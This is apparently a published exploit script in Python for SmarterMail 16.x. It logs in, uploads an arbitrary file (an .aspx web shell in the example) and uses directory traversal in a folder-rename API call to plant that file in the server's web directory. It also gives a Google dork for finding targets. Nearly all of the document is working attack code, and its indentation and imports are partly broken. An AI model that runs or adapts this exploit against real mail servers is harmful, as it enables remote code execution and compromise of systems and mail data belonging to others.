# Exploit Title: SmarterMail 16 - Arbitrary File Upload
# Google Dork: inurl:/interface/root
# Date: 2020-06-10
# Exploit Author: vvhack.org
# Vendor Homepage: https://www.smartertools.com
# Software Link: https://www.smartertools.com
# Version: 16.x
# Tested on: Windows
# CVE : N/A

#!/usr/bin/python3
import requests, json, argparse
from requests_toolbelt.multipart.encoder import MultipartEncoder

#example usage:
#Authenticated
#python3 exp.py -w http://mail.site.com/ -f ast.aspx
#Change username & password !

class Tak:

def __init__(self):
self.file_upload()
self.shell_upload()

def loginned(self):
self.urls = results.wbsn + '/api/v1/auth/authenticate-user'
self.myobja = {"username":"mail@mail.com","password":"password", "language":"en"}
self.xx = requests.post(self.urls, data = self.myobja)
self.data = json.loads(self.xx.text)
self.das = self.data['accessToken']
self.headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Authorization': "Bearer " + self.das}

def loginned_folder(self):
self.loginned()
self.url = results.wbsn + '/api/v1/mail/messages'
myobj = {"folder":"drafts","ownerEmailAddress":"","sortTyp e":5,"sortAscending":"false","query":"","skip":0," take":151,"selectedIds":[]}
x = requests.post(self.url, data = myobj, headers=self.headers)
print(x.text)

def create_folder(self):
self.loginned()
self.urlz = results.wbsn + '/api/v1/filestorage/folder-put'
myobj = {"folder": "testos1", "parentFolder":"Root Folder"}
myobj2= {"folder": "testos2", "parentFolder":"Root Folder"}
x = requests.post(self.urlz, data = myobj, headers=self.headers)
x = requests.post(self.urlz, data = myobj2, headers=self.headers)
print(x.text)

def file_upload(self):
self.create_folder()
'''
#resumableChunkNumber=1&
#resumableChunkSize=2097152&resumableCurrentChunkS ize=955319&resumableTotalSize=955319&
#resumableType=image%2Fjpeg&resumableIdentifier=95 5319-112097jpg&resumableFilename=112097.jpg&
#resumableRelativePath=112097.jpg&resumableTotalCh unks=1", headers={'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0",
#'Accept-Language': "en-US,en;q=0.5", 'Accept-Encoding': "gzip, deflate",
#print(self.xz)
#print(self.xz.headers)
'''
size = os.path.getsize(results.wbsf)
print(size)
replace_file = results.wbsf.replace(".","")
with open(results.wbsf, "rb") as outf:
contents = outf.read()
multipart_data = MultipartEncoder(
fields={
"context": "file-storage",
#"contextData": '{"folder":"Root Folder\\ " + str(results.wbsd) + ""}',
"contextData": '{"folder":"Root Folder\\\\testos1\\"}',
"resumableChunkNumber": "1",
"resumableChunkSize": "2097152",
"resumableCurrentChunkSize": str(size),
"resumableTotalSize": str(size),
"resumableType": "image/jpeg",
#"resumableIdentifier": "955319-112097jpg",
"resumableIdentifier": str(size) + "-" + str(replace_file),
"resumableFilename": results.wbsf,
"resumableRelativePath": results.wbsf,
"resumableTotalChunks": "1",
"file": (
'blob',#112097.jpg',
#open(file, "rb"),
contents,
#file,
#"image/jpeg"
"application/octet-stream"
#'text/plain'
)

}
)
'''
http_proxy = "http://127.0.0.1:8080"
proxyDict = {
"http" : http_proxy,
}
'''
# if you want to activate intercept then add with that argument, this parameter is necessary requiresfunc(if you want to activate it, please remove it from the comment line.) >> proxies=proxyDict
self.dre = requests.post(url=results.wbsn + "/api/upload",headers={"Content-Type": multipart_data.content_type,
'Authorization': "Bearer " + self.das,
'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"},data=multipart_data)

def shell_upload(self):

'''
http_proxy = "http://127.0.0.1:8080"
proxyDict = {
"http" : http_proxy,
}
'''

json_data = {
"folder": "Root Folder\\testos1",
"newFolderName": "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\ \..\\program files (x86)\\SmarterTools\\SmarterMail\\MRS\\testos1",
"parentFolder": "",
"newParentFolder": "Root Folder\\testos2"
}
#r = requests.post('http://mail.site.com/api/v1/filestorage/folder-patch', json=json_data, headers=self.headers, proxies=proxyDict)
r = requests.post(results.wbsn+'/api/v1/filestorage/folder-patch', json=json_data, headers=self.headers)
print(results.wbsn + "/testos1/" + results.wbsf)

if __name__ == '__main__':

parser = argparse.ArgumentParser()
parser.add_argument('-f', action='store', dest='wbsf',
help='Filename')
parser.add_argument('-w', action='store', dest='wbsn',
help='Target')
parser.add_argument('--version', action='version', version='SmartMail Knock Knock')
results = parser.parse_args()

tako = Tak()
tako
